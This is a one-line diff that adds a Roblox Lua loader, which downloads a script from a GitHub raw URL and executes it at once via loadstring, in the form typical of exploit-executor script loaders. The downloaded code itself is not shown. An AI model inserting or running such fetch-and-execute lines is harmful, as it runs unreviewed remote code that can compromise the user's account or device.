@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Smash0rPass/Cons-/refs/heads/main/Main", true))()
